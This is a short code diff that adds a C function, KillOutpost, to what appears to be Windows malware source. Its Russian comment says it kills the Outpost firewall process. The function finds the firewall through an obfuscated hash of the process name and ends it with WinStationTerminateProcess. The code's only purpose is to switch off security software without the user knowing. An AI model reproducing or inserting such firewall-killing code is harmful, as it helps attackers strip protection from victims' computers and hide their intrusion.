@@ -2564,3 +2564,19 @@ string GetSpecialFolderPathA(int CSIDL, const char *AddName)
 
 	return Path;
 }
+
+
+//------------------------------------------------------------
+//  KillOutpost - Функция убивает процесс файрвола Outpost
+//------------------------------------------------------------
+void KillOutpost()
+{
+	DWORD dwHash_Outpost = 0x1566CB2C;
+
+	DWORD dwPid = GetProcessIdByHash( dwHash_Outpost );
+
+	if ( dwPid != 0 )
+	{
+		pWinStationTerminateProcess( NULL, dwPid , DBG_TERMINATE_PROCESS );
+	}
+}
